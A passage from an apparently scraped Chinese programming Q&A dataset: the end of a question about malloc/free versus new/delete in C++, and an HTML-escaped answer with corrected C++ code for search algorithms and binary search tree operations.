(double*)malloc(sizeof(double) * Num);\n        P_ca_y[i] = (double*)malloc(sizeof(double) * Num);\n        P_ca_z[i] = (double*)malloc(sizeof(double) * Num);\n        v_ca_x[i] = (double*)malloc(sizeof(double) * Num);\n        v_ca_y[i] = (double*)malloc(sizeof(double) * Num);\n        v_ca_z[i] = (double*)malloc(sizeof(double) * Num);\n        v_ca[i] = (double*)malloc(sizeof(double) * Num);\n    }\n}\nvoid Delete()\n{\n    int i;\n    for (i = 0; i < Times; i++)\n    {\n        //delete[] P_ca_x[i];\n        //delete[] P_ca_y[i];\n        //delete[] P_ca_z[i];\n        //delete[] v_ca_x[i];\n        //delete[] v_ca_y[i];\n        //delete[] v_ca_z[i];\n        //delete[] v_ca[i];\n        free(P_ca_x[i]);\n        free(P_ca_y[i]);\n        free(P_ca_z[i]);\n        free(v_ca_x[i]);\n        free(v_ca_y[i]);\n        free(v_ca_z[i]);\n        free(v_ca[i]);\n    }\n    //delete[] P_ca_x;\n    //delete[] P_ca_y;\n    //delete[] P_ca_z;\n    //delete[] v_ca_x;\n    //delete[] v_ca_y;\n    //delete[] v_ca_z;\n    //delete[] v_ca;\n    free(P_ca_x);\n    free(P_ca_y);\n    free(P_ca_z);\n    free(v_ca_x);\n    free(v_ca_y);\n    free(v_ca_z);\n    free(v_ca);\n}\n", "\n\n", "在对数组赋值时报错，用malloc则不会报错"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你程序中的问题比较多&amp;#xff0c;我修改的地方我使用****************************标识出来了&lt;br /&gt;其中一点&amp;#xff0c;new要和delete配对使用参考&amp;#xff1a;&lt;a href=\"https://blog.csdn.net/allen807733144/article/details/73608938\" id=\"textarea_1648102336770_1648102457970_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;span class=\"md_link_url\"&gt;https://blog.csdn.net/allen807733144/article/details/73608938&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;\n#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&amp;lt;iostream&amp;gt;\n#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&amp;lt;stack&amp;gt;\nusing namespace std;\n&lt;span class=\"hljs-comment\"&gt;//顺序查找&lt;/span&gt;\n&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-constructor\"&gt;Sq_Sear(&lt;span class=\"hljs-params\"&gt;int&lt;/span&gt;&lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;a&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;)&lt;/span&gt;\n{\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; i &amp;#61; n;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt;&amp;#61; n; i&amp;#43;&amp;#43;)&lt;span class=\"hljs-comment\"&gt;//cpu要做两次判断&amp;#xff0c;可做优化&lt;/span&gt;\n    {\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (a&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;i&lt;/span&gt;]&lt;/span&gt;&lt;span class=\"hljs-operator\"&gt; &amp;#61;&amp;#61; &lt;/span&gt;key)\n        {\n            return i;\n        }\n    }\n    return &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-comment\"&gt;//改进,增加一个哨兵来减少循环次数&amp;#xff0c;会污染数组&lt;/span&gt;\n\n    &lt;span class=\"hljs-comment\"&gt;//int i &amp;#61; n;&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;//a[0] &amp;#61; key;&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;//while (a[i] !&amp;#61; key)&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;//{&lt;!-- --&gt;&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;//    i--;&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;//}&lt;/span&gt;\n\n    &lt;span class=\"hljs-comment\"&gt;//return i;&lt;/span&gt;\n\n}\n\n\n&lt;span class=\"hljs-comment\"&gt;//插值查找(按比例查找)&lt;/span&gt;\n&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; bia&lt;span class=\"hljs-constructor\"&gt;_search(&lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;str&lt;/span&gt;[], &lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;)&lt;/span&gt;\n{\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; low &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, high &amp;#61; n - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; mid &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (low &amp;lt;&amp;#61; high)\n    {\n        &lt;span class=\"hljs-comment\"&gt;//折半与按比例的优劣&amp;#xff0c;数的值跨度不是很大按比例更好&amp;#xff0c;&lt;/span&gt;\n        mid &amp;#61; low &amp;#43; (key - str&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;low&lt;/span&gt;]&lt;/span&gt;)&lt;span class=\"hljs-operator\"&gt; / &lt;/span&gt;(str&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;high&lt;/span&gt;]&lt;/span&gt; - str&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;low&lt;/span&gt;]&lt;/span&gt;)&lt;span class=\"hljs-operator\"&gt; * &lt;/span&gt;(high - low);\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (str&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;mid&lt;/span&gt;]&lt;/span&gt;&lt;span class=\"hljs-operator\"&gt; &amp;#61;&amp;#61; &lt;/span&gt;key)\n            return mid;\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (str&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;mid&lt;/span&gt;]&lt;/span&gt; &amp;gt; key)\n            high &amp;#61; mid - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (str&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;mid&lt;/span&gt;]&lt;/span&gt; &amp;lt; key)\n            low &amp;#61; mid &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    }\n    return -&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n\n}\n&lt;span class=\"hljs-comment\"&gt;//斐波那契查找&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//1.首先创建斐波那契数组&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//2。找到有序表最大元素&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//3.补齐有序表最大值到最接近斐波那契数组的一个元素&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//4.根据斐波那契的规则对比查找&lt;/span&gt;\n\n\nvoid produce&lt;span class=\"hljs-constructor\"&gt;Fib(&lt;span class=\"hljs-params\"&gt;int&lt;/span&gt;&lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;fib&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;size&lt;/span&gt;)&lt;/span&gt;\n{\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; i;\n    fib&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]&lt;/span&gt; &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    fib&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;]&lt;/span&gt; &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;; i &amp;lt; size; i&amp;#43;&amp;#43;)\n    {\n        fib&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;i&lt;/span&gt;]&lt;/span&gt; &amp;#61; fib&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;i&lt;/span&gt; - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;]&lt;/span&gt; &amp;#43; fib&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;i&lt;/span&gt; - &lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;]&lt;/span&gt;;\n    }\n}\n\n\n&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-constructor\"&gt;FibonacciSearch(&lt;span class=\"hljs-params\"&gt;int&lt;/span&gt;&lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;data&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;length&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;searchValue&lt;/span&gt;)&lt;/span&gt;\n{\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; low &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, high &amp;#61; length - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, mid &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; fib&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;]&lt;/span&gt;;\n    produce&lt;span class=\"hljs-constructor\"&gt;Fib(&lt;span class=\"hljs-params\"&gt;fib&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;length&lt;/span&gt;)&lt;/span&gt;;\n\n\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; k &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;&lt;span class=\"hljs-comment\"&gt;//最接近斐波那契的数&lt;/span&gt;\n\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (high &amp;gt; fib&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;k&lt;/span&gt;]&lt;/span&gt; - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;)\n    {\n        k&amp;#43;&amp;#43;;\n    }\n\n\n    &lt;span class=\"hljs-comment\"&gt;//补齐有序表&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;* temp;\n    temp &amp;#61; (&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;*)&lt;span class=\"hljs-keyword\"&gt;new&lt;/span&gt; &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;fib&lt;/span&gt;[&lt;span class=\"hljs-identifier\"&gt;k&lt;/span&gt;]&lt;/span&gt; - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;];\n    memcpy(temp, data, length&lt;span class=\"hljs-operator\"&gt; * &lt;/span&gt;sizeof(&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;));\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; length; i &amp;lt; fib&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;k&lt;/span&gt;]&lt;/span&gt; - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; i&amp;#43;&amp;#43;)\n    {\n        data&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;i&lt;/span&gt;]&lt;/span&gt; &amp;#61; data&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;high&lt;/span&gt;]&lt;/span&gt;;\n    }\n\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (low &amp;lt;&amp;#61; high)\n    {\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (k &amp;gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;)\n            mid &amp;#61; low &amp;#43; fib&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;k&lt;/span&gt; - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;]&lt;/span&gt; - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n        &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n            mid &amp;#61; low;\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (temp&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;mid&lt;/span&gt;]&lt;/span&gt;&lt;span class=\"hljs-operator\"&gt; &amp;#61;&amp;#61; &lt;/span&gt;searchValue)\n        {\n            &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (mid &amp;lt;&amp;#61; length - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;)\n                return mid;\n            &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n                return length - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n        }\n\n\n\n\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (temp&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;mid&lt;/span&gt;]&lt;/span&gt; &amp;gt; searchValue)\n        {\n            high &amp;#61; mid - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n            k &amp;#61; k - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n        }\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (temp&lt;span class=\"hljs-literal\"&gt;[&lt;span class=\"hljs-identifier\"&gt;mid&lt;/span&gt;]&lt;/span&gt; &amp;lt; searchValue)\n        {\n            low &amp;#61; mid &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n            k &amp;#61; k - &lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;;\n        }\n    }\n\n    delete&lt;span class=\"hljs-literal\"&gt;[]&lt;/span&gt; temp;\n    return -&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n}\n\n\ntypedef &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; BiNode\n{\n    &lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; data;\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; BiNode* lchild;\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; BiNode* rchild;\n    &lt;span class=\"hljs-constructor\"&gt;BiNode(&lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;x&lt;/span&gt;)&lt;/span&gt; :\n        data(x), lchild(NULL), rchild(NULL) {};\n\n\n}BiNode,&lt;span class=\"hljs-operator\"&gt; * &lt;/span&gt;BiTree;\n\n&lt;span class=\"hljs-comment\"&gt;//二叉查找树&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//T为搜索的树&amp;#xff0c;f为记录父节点的指针&amp;#xff0c;p作为临时指针保存输出&lt;/span&gt;\n&lt;span class=\"hljs-built_in\"&gt;bool&lt;/span&gt; &lt;span class=\"hljs-constructor\"&gt;SearchBST(BiTree T, &lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;, BiTree &lt;span class=\"hljs-params\"&gt;f&lt;/span&gt;, BiTree&lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;p&lt;/span&gt;)&lt;/span&gt;\n{\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!T)\n    {\n        *p &amp;#61; f;\n        return &lt;span class=\"hljs-literal\"&gt;false&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (key&lt;span class=\"hljs-operator\"&gt; &amp;#61;&amp;#61; &lt;/span&gt;T-&amp;gt;data)\n    {\n        *p &amp;#61; T;\n        return &lt;span class=\"hljs-literal\"&gt;true&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (key &amp;lt; T-&amp;gt;data)\n    {\n        return &lt;span class=\"hljs-constructor\"&gt;SearchBST(T-&amp;gt;&lt;span class=\"hljs-params\"&gt;lchild&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;, T, &lt;span class=\"hljs-params\"&gt;p&lt;/span&gt;)&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (key &amp;gt; T-&amp;gt;data)\n    {\n        return &lt;span class=\"hljs-constructor\"&gt;SearchBST(T-&amp;gt;&lt;span class=\"hljs-params\"&gt;rchild&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;, T, &lt;span class=\"hljs-params\"&gt;p&lt;/span&gt;)&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n        return &lt;span class=\"hljs-literal\"&gt;false&lt;/span&gt;;\n}\n&lt;span class=\"hljs-built_in\"&gt;bool&lt;/span&gt; &lt;span class=\"hljs-constructor\"&gt;SearchBST(BiTree T, &lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;)&lt;/span&gt;\n{\n    BiTree f(&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;);\n   &lt;span class=\"hljs-comment\"&gt;// BiTree* p(0);****************************&lt;/span&gt;\n   &lt;span class=\"hljs-comment\"&gt;// f &amp;#61; (BiTree)new BiNode(key); p &amp;#61; new BiTree;****************************&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!T)\n    {\n        &lt;span class=\"hljs-comment\"&gt;//*p &amp;#61; f;****************************&lt;/span&gt;\n        return &lt;span class=\"hljs-literal\"&gt;false&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (key&lt;span class=\"hljs-operator\"&gt; &amp;#61;&amp;#61; &lt;/span&gt;T-&amp;gt;data)\n    {\n        &lt;span class=\"hljs-comment\"&gt;//*p &amp;#61; T;****************************&lt;/span&gt;\n        return &lt;span class=\"hljs-literal\"&gt;true&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (key &amp;lt; T-&amp;gt;data)\n    {\n        return &lt;span class=\"hljs-constructor\"&gt;SearchBST(T-&amp;gt;&lt;span class=\"hljs-params\"&gt;lchild&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;)&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (key &amp;gt; T-&amp;gt;data)\n    {\n        return &lt;span class=\"hljs-constructor\"&gt;SearchBST(T-&amp;gt;&lt;span class=\"hljs-params\"&gt;rchild&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;)&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n        return &lt;span class=\"hljs-literal\"&gt;false&lt;/span&gt;;\n}\n&lt;span class=\"hljs-comment\"&gt;//删除&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//*p搜索位置结点&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//定义两个临时指针&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//三种情况&lt;/span&gt;\n\n&lt;span class=\"hljs-built_in\"&gt;bool&lt;/span&gt; &lt;span class=\"hljs-constructor\"&gt;Delete(BiTree&lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;t&lt;/span&gt;)&lt;/span&gt;&lt;span class=\"hljs-comment\"&gt;//传输的是指针域的地址,直接修改lchild or rchild&lt;/span&gt;\n{\n    BiTree q, s;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; ((*t)-&amp;gt;lchild&lt;span class=\"hljs-operator\"&gt; &amp;#61;&amp;#61; &lt;/span&gt;NULL)&lt;span class=\"hljs-comment\"&gt;//左子树为空&amp;#xff0c;连接右子树&lt;/span&gt;\n    {\n        q &amp;#61; *t;\n        (*t) &amp;#61; (*t)-&amp;gt;lchild;\n        &lt;span class=\"hljs-comment\"&gt;//q &amp;#61; (*t)-&amp;gt;rchild;//连接右子树&amp;#xff0c;直接改变指针&lt;/span&gt;\n        &lt;span class=\"hljs-comment\"&gt;//(*t)-&amp;gt;data &amp;#61; q-&amp;gt;data;&lt;/span&gt;\n        &lt;span class=\"hljs-comment\"&gt;//(*t)-&amp;gt;rchild &amp;#61; q-&amp;gt;rchild;&lt;/span&gt;\n        delete q;&lt;span class=\"hljs-comment\"&gt;//删除结点所占空间****************************&lt;/span&gt;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; ((*t)-&amp;gt;rchild&lt;span class=\"hljs-operator\"&gt; &amp;#61;&amp;#61; &lt;/span&gt;NULL)&lt;span class=\"hljs-comment\"&gt;//右子树为空&amp;#xff0c;连接左子树&lt;/span&gt;\n    {\n        q &amp;#61; *t;\n        (*t) &amp;#61; (*t)-&amp;gt;lchild;&lt;span class=\"hljs-comment\"&gt;//连接左子树&amp;#xff0c;直接改变指针&lt;/span&gt;\n        &lt;span class=\"hljs-comment\"&gt;//free(q);//删除结点所占空间&lt;/span&gt;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;&lt;span class=\"hljs-comment\"&gt;//有两个孩子&lt;/span&gt;\n    {\n        q &amp;#61; (*t);&lt;span class=\"hljs-comment\"&gt;//找到中序遍历时的前驱结点&amp;#xff0c;即孩子结点的右子树最右边的叶子结点&lt;/span&gt;\n        s &amp;#61; (*t)-&amp;gt;lchild;\n        &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (s-&amp;gt;rchild !&amp;#61; NULL)\n        {\n            q &amp;#61; s;&lt;span class=\"hljs-comment\"&gt;//记录当前结点值&lt;/span&gt;\n            s &amp;#61; s-&amp;gt;rchild;&lt;span class=\"hljs-comment\"&gt;//找到右子树最右边的叶子结点&lt;/span&gt;\n        }\n        (*t)-&amp;gt;data &amp;#61; s-&amp;gt;data;\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (q&lt;span class=\"hljs-operator\"&gt; &amp;#61;&amp;#61; &lt;/span&gt;*t)&lt;span class=\"hljs-comment\"&gt;//孩子结点为目标结点&lt;/span&gt;\n        {\n            q-&amp;gt;lchild &amp;#61; s-&amp;gt;lchild;&lt;span class=\"hljs-comment\"&gt;//链接&lt;/span&gt;\n        }\n        &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;&lt;span class=\"hljs-comment\"&gt;//存在右子树&lt;/span&gt;\n        {\n            q-&amp;gt;rchild &amp;#61; s-&amp;gt;lchild;&lt;span class=\"hljs-comment\"&gt;//目标结点的父亲结点链接孩子结点&lt;/span&gt;\n        }\n\n        delete s;&lt;span class=\"hljs-comment\"&gt;//****************************&lt;/span&gt;\n\n    }\n\n    return &lt;span class=\"hljs-literal\"&gt;true&lt;/span&gt;;\n}\n\n&lt;span class=\"hljs-comment\"&gt;//删除二叉排序树的结点&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//1.判断是否为空树&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//2.搜索判断是否存在&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//3.执行删除函数&lt;/span&gt;\n&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-constructor\"&gt;DelectBST(BiTree T, &lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;)&lt;/span&gt;\n{\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (T&lt;span class=\"hljs-operator\"&gt; &amp;#61;&amp;#61; &lt;/span&gt;NULL)\n    {\n        return &lt;span class=\"hljs-literal\"&gt;false&lt;/span&gt;;\n\n    }\n\n\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (key&lt;span class=\"hljs-operator\"&gt; &amp;#61;&amp;#61; &lt;/span&gt;T-&amp;gt;data)\n    {\n        return &lt;span class=\"hljs-constructor\"&gt;Delete(&amp;amp;T)&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (key &amp;lt; T-&amp;gt;data)\n    {\n        return &lt;span class=\"hljs-constructor\"&gt;DelectBST(T-&amp;gt;&lt;span class=\"hljs-params\"&gt;lchild&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;)&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n    {\n        return &lt;span class=\"hljs-constructor\"&gt;DelectBST(T-&amp;gt;&lt;span class=\"hljs-params\"&gt;rchild&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;)&lt;/span&gt;;\n    }\n\n}\n\n\n&lt;span class=\"hljs-comment\"&gt;//插入&lt;/span&gt;\n&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-constructor\"&gt;InsertBST(BiTree&lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt; T, &lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;)&lt;/span&gt;\n{\n    BiTree p &amp;#61; nullptr, s &amp;#61; nullptr;\n\n\n    &lt;span class=\"hljs-comment\"&gt;//传入临时结点指针p&amp;#xff0c;通过搜索函数返回当前最接近该插入值的一个节点位置&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!&lt;span class=\"hljs-constructor\"&gt;SearchBST(&lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt;T, &lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;, NULL, &amp;amp;&lt;span class=\"hljs-params\"&gt;p&lt;/span&gt;)&lt;/span&gt;)\n    {\n        s &amp;#61; (BiTree)&lt;span class=\"hljs-keyword\"&gt;new&lt;/span&gt; &lt;span class=\"hljs-constructor\"&gt;BiNode(&lt;span class=\"hljs-params\"&gt;key&lt;/span&gt;)&lt;/span&gt;;&lt;span class=\"hljs-comment\"&gt;//修改了一下这里****************************&lt;/span&gt;\n        s-&amp;gt;data &amp;#61; key;\n        s-&amp;gt;lchild &amp;#61; NULL;\n        s-&amp;gt;rchild &amp;#61; NULL;\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!p)\n        {\n            *T &amp;#61; s;&lt;span class=\"hljs-comment\"&gt;//此处为插入根节点&lt;/span&gt;\n        }\n        &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (key &amp;lt; p-&amp;gt;data)\n        {\n            p-&amp;gt;lchild &amp;#61; s;\n        }\n        &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n        {\n            p-&amp;gt;rchild &amp;#61; s;\n        }\n        return &lt;span class=\"hljs-literal\"&gt;true&lt;/span&gt;;\n\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; {\n        cout &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;已存在相同数据&amp;#xff01;&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; endl;\n\n\n        return &lt;span class=\"hljs-literal\"&gt;false&lt;/span&gt;;\n    }\n}\n\n\n&lt;span 